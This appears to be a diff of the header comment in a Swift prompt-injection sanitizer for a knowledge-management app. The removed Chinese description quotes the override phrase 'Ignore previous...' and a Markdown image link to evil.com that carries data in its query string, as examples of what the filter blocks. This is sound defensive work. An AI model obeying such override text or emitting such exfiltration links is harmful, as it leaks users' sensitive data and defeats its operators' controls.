@@ -1,15 +1,13 @@
-// PromptSanitizer.swift
 //
-// 作者: Wang Chong
-// 功能说明: [L0.5] 系统集成层：本文件实现了知识管理系统的 Prompt 注入拦截与防御过滤服务（PromptSanitizer）。
-// 核心职责：
-// 1. 防御 adversarial system overrides：拦截并过滤恶意 Prompt 注入指令（如 "Ignore previous..."）。
-// 2. 数据防外泄（DLP）：过滤 Markdown 动态外链图片（如 "![leak](https://evil.com/leak?data=...)"），防止敏感数据通过 HTTP 请求外泄。
-// 3. XML 语境沙箱化：对召回上下文（Context Chunks）执行 XML 标签级安全包裹。
-// 版本: 1.0
-// 日期: 2026-05-19
-// 版权: © 2026 Wang Chong。保留所有权利。
-
+//  PromptSanitizer.swift
+//  ZhiYu
+//
+//  Created by Antigravity on 2026/05/23.
+//  Copyright © 2026 WangChong. All rights reserved.
+//
+//  系统层级：[L0.5] 系统集成层
+//  核心职责：属于 Security 模块，提供相关的结构体或工具支撑。
+//
 import Foundation
 
 /// 智能 Prompt 防御净化层 (PromptSanitizer)
